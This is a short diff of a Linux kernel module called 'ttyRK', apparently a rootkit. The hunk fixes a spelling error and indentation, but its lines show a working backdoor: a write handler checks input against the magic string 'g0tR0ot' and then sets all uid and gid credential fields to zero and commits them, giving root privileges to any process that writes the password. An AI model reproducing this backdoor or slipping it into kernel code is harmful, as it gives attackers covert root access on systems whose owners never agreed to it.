@@ -60,21 +60,21 @@ static ssize_t root_write(struct file *f, const char __user *buffer, size_t len,
     char magic[] = "g0tR0ot";
     struct cred *new_cred;
 
-    data = (char *)kmalloc(len + 1, GFP_KERNEL);
+    data = (char *) kmalloc(len + 1, GFP_KERNEL);
 
     if (data) {
         copy_from_user(data, buffer, len);
         if (memcmp(data, magic, 7) == 0) {
             if ((new_cred = prepare_creds()) == NULL) {
-                printk("ttyRK: Cannot prepare crednetials\n");
+                printk("ttyRK: Cannot prepare credentials\n");
                 return 0;
             }
-        printk("ttyRK: You got in.\n");
-        V(new_cred -> uid) = V(new_cred -> gid) = 0;
-        V(new_cred -> euid) = V(new_cred -> egid) = 0;
-        V(new_cred -> suid) = V(new_cred -> sgid) = 0;
-        V(new_cred -> fsuid) = V(new_cred -> fsgid) = 0;
-        commit_creds(new_cred); 
+            printk("ttyRK: You got in.\n");
+            V(new_cred -> uid) = V(new_cred -> gid) = 0;
+            V(new_cred -> euid) = V(new_cred -> egid) = 0;
+            V(new_cred -> suid) = V(new_cred -> sgid) = 0;
+            V(new_cred -> fsuid) = V(new_cred -> fsgid) = 0;
+            commit_creds(new_cred); 
         }
         kfree(data);
       } else {
